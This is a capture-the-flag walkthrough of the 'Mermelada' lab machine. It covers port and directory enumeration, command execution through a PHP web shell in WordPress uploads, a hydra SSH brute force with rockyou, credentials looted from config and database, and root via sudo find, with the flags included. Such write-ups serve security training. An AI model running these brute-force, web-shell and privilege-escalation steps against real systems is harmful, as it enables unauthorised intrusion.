# Mermelada [https://labs.thehackerslabs.com/machine/164]

# Nmap Scan Result

```
$ sudo nmap -sCV -p- 192.168.173.130
[sudo] password for tutu: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 13:18 GMT
Nmap scan report for 192.168.173.130
Host is up (0.00047s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: Mermelada
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

# Dir Enumeration

```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://192.168.173.130/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.173.130/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 114ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1ms]
uploads                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms]
wordpress               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 3ms]
:: Progress: [20481/20481] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://192.168.173.130/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.173.130/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 79ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 81ms]
login                   [Status: 200, Size: 1700, Words: 607, Lines: 75, Duration: 7ms]
:: Progress: [20481/20481] :: Job [1/1] :: 20 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

`http://192.168.173.130/uploads/compra.txt`

```
[+] Strawberry jam 
[+] Raspberry jam 
[+] Blackberry jam 
[+] jam by dW4gcGlxdWl0bz8K 
[+] Apricot jam 
[+] Mango jam
```

```
$ echo "dW4gcGlxdWl0bz8K" | base64 -d
un piquito? - A little bit?
```

# Wordpress

```
http://192.168.173.130//wordpress/wp-content/uploads/2026/01/macoduweklgkmvp-1767607866.7342.php?cmd=ls%20-la%20/home

GIF689a; total 16 drwxr-xr-x 4 root root 4096 Dec 28 23:48 . drwxr-xr-x 18 root root 4096 Dec 29 00:36 .. drwx------ 2 debian debian 4096 Oct 16 2024 debian drwx------ 2 mermeladita mermeladita 4096 Jan 3 20:37 mermeladita
```

# SSh Brute

```
$ hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://192.168.173.130

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-15 13:51:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.173.130:22/

[22][ssh] host: 192.168.173.130   login: debian   password: 12345

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-15 13:51:19
```

# Enumeration

```
debian@debian:~$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 dic 29 01:59 .
drwxr-xr-x 18 root root 4096 dic 29 00:36 ..
-rw-r--r--  1 root root  280 dic 29 01:59 .credenciales
debian@debian:~$ cat /opt/.credenciales
-----------------------------------------------------------------
Credenciales DB 
----------------------------------------------------------------
[+] Usuario DB -----> wwwuser
[+] Contraseña DB --> micontraseña
----------------------------------------------------------------
debian@debian:~$ 
```

```
$ cat /var/www/html/wordpress/wp-config.php

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '12345' );
```

# MYSQL

```
debian@debian:~$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mermelada          |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,002 sec)

MariaDB [(none)]> 

```

```
MariaDB [(none)]> USE mermelada;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mermelada]> show TABLES;
+-----------------------------+
| Tables_in_mermelada         |
+-----------------------------+
| users                       |
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
20 rows in set (0,001 sec)

MariaDB [mermelada]> 
```

```
MariaDB [mermelada]> select * from users;
+----+-------------+--------+
| id | usuario     | passwd |
+----+-------------+--------+
|  1 | mermeladita | pepitU |
+----+-------------+--------+
1 row in set (0,001 sec)

MariaDB [mermelada]> 

```

# User Flag

```
debian@debian:~$ su mermeladita
Contraseña: 
mermeladita@debian:/home/debian$ cd ~/
mermeladita@debian:~$ ls
user.txt
mermeladita@debian:~$ cat user.txt
KNBPPGDVSADNQDGBDADMKDQLADADASDP
mermeladita@debian:~$ 
```

# Priv Esca

```
mermeladita@debian:~$ sudo -l
Matching Defaults entries for mermeladita on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mermeladita may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/find
mermeladita@debian:~$ 
```

# GTFOBins

```
It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    sudo find . -exec /bin/sh \; -quit

```
# Root Flag

```
mermeladita@debian:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
# cd /root
# ls
congrats.txt  root.txt
# cat root.txt
MDHSABDASKDASDAPÑHOTBBQSAMCFNAMGTPEXAFGH
# 
```


